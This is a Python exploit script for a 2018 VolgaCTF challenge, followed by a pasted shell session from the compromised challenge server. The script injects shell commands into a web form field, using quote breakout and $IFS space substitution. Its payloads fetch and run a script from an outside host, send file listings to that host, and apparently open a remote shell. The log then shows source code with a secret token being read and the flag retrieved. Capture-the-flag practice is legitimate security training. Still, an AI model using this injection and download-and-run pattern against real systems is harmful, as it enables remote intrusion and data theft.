#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

payload = "curl 'l4ys.tw:1234'"
payload = "cd$IFS'/tmp'&&wget 'l4ys.tw/lazyl4ys.sh'"
payload = "curl 'l4ys.tw/'$(ls /tmp/l*)"
payload = "bash /tmp/lazyl4ys.sh"
site = "';%s;'" % payload.replace(" ", '$IFS')
print site
requests.post("http://seo-kings.quals.2018.volgactf.ru:8080/", data={"site": site})


"""

nobody@seo-kings:/opt/seo-kings/app/controllers$
nobody@seo-kings:/opt/seo-kings/app/controllers$
nobody@seo-kings:/opt/seo-kings/app/controllers$ ls
ls
admin_controller.rb
application_controller.rb
main_controller.rb
nobody@seo-kings:/opt/seo-kings/app/controllers$ cat admin_controller.rb
cat admin_controller.rb
require './app/controllers/application_controller.rb'





class AdminController < ApplicationController


 OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE

  SECRET_TOKEN = "d595462f496fd347796b60b605b72ff6"

  get '/' do

    if local?
      token = params[:token]
      if(token == SECRET_TOKEN)
        @flag = Flagclass::FLAG
        erb :flag
      end
    else
        "Please, use local ip"
    end


  end



endnobody@seo-kings:/opt/seo-kings/app/controllers$ curl localhost:8080/admin/?token=d595462f496fd347796b60b605b72ff6
< localhost:8080/admin/?token=d595462f496fd347796b60b605b72ff6
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   114  100   114    0     0  15293      0 --:--:-- --:--:-- --:--:-- 16285
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
VolgaCTF{hope_it_was_like_madness}</body>
</html>nobody@seo-kings:/opt/seo-kings/app/controllers$
"""
